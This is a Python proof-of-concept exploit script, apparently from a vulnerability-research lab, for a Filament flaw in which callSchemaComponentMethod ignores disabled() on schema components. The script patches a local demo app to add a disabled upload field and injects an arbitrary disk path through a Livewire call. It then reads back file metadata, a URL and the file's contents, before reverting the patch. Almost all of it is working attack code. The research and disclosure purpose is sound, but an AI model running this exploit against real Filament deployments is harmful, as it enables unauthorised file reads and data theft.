#!/usr/bin/env python3
"""
VULN-012 — callSchemaComponentMethod enforces hidden() but not disabled()

Vulnerable code: targets/filament/packages/schemas/src/Concerns/InteractsWithSchemas.php:83-127
  callSchemaComponentMethod():
    - :89  $component = $this->getSchemaComponent($componentKey);   // filters HIDDEN; ignores disabled
    - :~102 checks the #[ExposedLivewireMethod] attribute — the ONLY gate
    - :126 $component->{$method}(...)                               // invoked; NO isDisabled() check
  Contrast: the table dispatcher DOES guard — packages/tables/src/Concerns/HasColumns.php:63
            `if ($column->isDisabled()) { return null; }`

Class: channel divergence / incomplete state-gate (widens the VULN-004 read primitive).

The flaw in plain English
-------------------------
The generic schema-component dispatcher lets the browser invoke any
#[ExposedLivewireMethod] on a schema component. It excludes HIDDEN components but applies
NO isDisabled() guard — so an exposed method on a field rendered ->disabled() (e.g.
disabled for non-owners) is still invokable over /livewire/update. The sibling table
dispatcher enforces exactly that check, making this an inconsistency, not a design choice.
The not-self-guarded reachable sink is getUploadedFiles() (the VULN-004 metadata/URL
oracle), so this widens VULN-004 to fields presented as non-interactive.

Exploitation idea
-----------------
On a FileUpload rendered ->disabled(), inject an arbitrary disk path into the field's raw
state and call getUploadedFiles via callSchemaComponentMethod. Despite the disabled state,
the dispatcher resolves the component and invokes the method → the VULN-004 oracle fires.

What a successful run proves
---------------------------
The field is rendered with `disabled="disabled"`, yet callSchemaComponentMethod returns
size/MIME/URL for an attacker-named path on the disabled field — the disabled state is not
enforced server-side for exposed methods.

Harness note: the demo app has no disabled FileUpload, so this exploit temporarily adds one
(a standard `->disabled()` field — the documented way a developer disables a field) to the
demo component in-container, tests, and reverts it. It does NOT touch library code; the
defect being proven is the library dispatcher ignoring isDisabled().
"""

import os
import sys
import time
import json
import secrets

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from lib.livewire import LivewireClient      # noqa: E402
from lib.common import log, banner, verdict  # noqa: E402
from lib import lab                          # noqa: E402

BASE_URL = os.environ.get("BASE_URL", "http://localhost:21890")
VULN_ID = "VULN-012"
HERE = os.path.dirname(os.path.abspath(__file__))
EVID = os.path.join(HERE, "evidence")
SCHEMA_FILE = "/opt/filament-src/docs-assets/app/app/Livewire/Forms/Fields/FileUploadSchema.php"
PAGE = f"{BASE_URL}/forms/fields/file-upload"
FIELD = "fileUploadDisabled"


def patch_add_disabled_field() -> None:
    insert = (f'            Group::make()->id("{FIELD}")->schema(['
              f'FileUpload::make("{FIELD}")->disk("public")->disabled()]),')
    lab.exec_app(["sh", "-c",
                  f'cp {SCHEMA_FILE} {SCHEMA_FILE}.bak && '
                  f"sed -i '/        return \\[/a\\{insert}' {SCHEMA_FILE}"])


def revert() -> None:
    # touch after restoring so opcache (validate_timestamps) reloads the older-mtime original.
    lab.exec_app(["sh", "-c",
                  f'[ -f {SCHEMA_FILE}.bak ] && mv {SCHEMA_FILE}.bak {SCHEMA_FILE} && touch {SCHEMA_FILE} || true'],
                 check=False)


def wait_for_field(present: bool, timeout: int = 12) -> bool:
    """Poll the page until the disabled field appears/disappears (opcache revalidates ~2s)."""
    import requests
    for _ in range(timeout):
        try:
            seen = FIELD in requests.get(PAGE, timeout=10).text
            if seen == present:
                return True
        except Exception:  # noqa: BLE001
            pass
        time.sleep(1)
    return False


def main() -> int:
    banner(VULN_ID, "callSchemaComponentMethod ignores disabled() → exposed method on disabled field",
           BASE_URL, "InteractsWithSchemas::callSchemaComponentMethod — no isDisabled() guard")
    os.makedirs(EVID, exist_ok=True)

    suffix = secrets.token_hex(4)
    victim = f"disabled-victim-{suffix}/secret-{suffix}.txt"
    secret = f"DISABLED-SECRET-{suffix}: reachable on a field the UI renders disabled"
    lab.put_public_file(victim, secret)

    log("SETUP", "adding a standard ->disabled() FileUpload to the demo (harness: the finding "
                 "needs a disabled field; this uses the documented ->disabled() feature, reverted after)")
    patch_add_disabled_field()
    if not wait_for_field(present=True):
        revert()
        log("FAIL", "disabled field did not appear (opcache?)")
        verdict(VULN_ID, "FAILED", "harness field not applied")
        return 1
    try:
        # Confirm the field is genuinely rendered disabled.
        import requests
        html = requests.get(PAGE, timeout=10).text
        disabled_rendered = 'disabled="disabled"' in html and FIELD in html
        log("INFO", f"field '{FIELD}' rendered with disabled attribute: {disabled_rendered}")

        c = LivewireClient(BASE_URL)
        fu = c.get_component(PAGE, component_name="forms.fields-demo")
        present = FIELD in fu.data()
        log("STEP", f"calling callSchemaComponentMethod('form.{FIELD}','getUploadedFiles') on the "
                    f"DISABLED field with an injected path (field in state: {present})")
        body = fu.call("callSchemaComponentMethod", f"form.{FIELD}", "getUploadedFiles",
                       updates={f"data.{FIELD}": {"inj": victim}})
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(json.dumps(body, indent=2)[:3000])
        ret = body["components"][0].get("effects", {}).get("returns")
        meta = ret[0].get("inj") if isinstance(ret, list) and ret and isinstance(ret[0], dict) else None
        log("INFO", f"returns: {json.dumps(ret)[:200]}")

        if meta and meta.get("url"):
            log("PROOF", f"disabled field STILL returned metadata/URL: size={meta.get('size')} "
                         f"url={meta.get('url')} — isDisabled() not enforced for exposed methods")
            r = c.session.get(meta["url"], timeout=20)
            read_ok = secret in r.text
            with open(os.path.join(EVID, "leaked_via_disabled_field.txt"), "w") as f:
                f.write(r.text)
            log("PROOF", f"fetched the URL → HTTP {r.status_code}; victim content read: {read_ok}")
            log("OK", "exploit confirmed — the schema dispatcher invoked an exposed read method on a "
                      "->disabled() field (the table dispatcher guards this; the schema one does not)")
            verdict(VULN_ID, "CONFIRMED",
                    "callSchemaComponentMethod invokes #[ExposedLivewireMethod] on ->disabled() fields "
                    "(no isDisabled() guard) → VULN-004 oracle reachable on disabled fields")
            return 0

        log("FAIL", "disabled field did not return metadata — dispatcher may have guarded it")
        verdict(VULN_ID, "FAILED", "no metadata returned on disabled field")
        return 1
    finally:
        revert()
        wait_for_field(present=False, timeout=6)
        log("SETUP", "reverted the harness disabled field; demo restored to pristine")


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:  # noqa: BLE001
        log("FAIL", f"unexpected error: {e!r}")
        verdict(VULN_ID, "FAILED", f"exception: {e!r}")
        sys.exit(1)
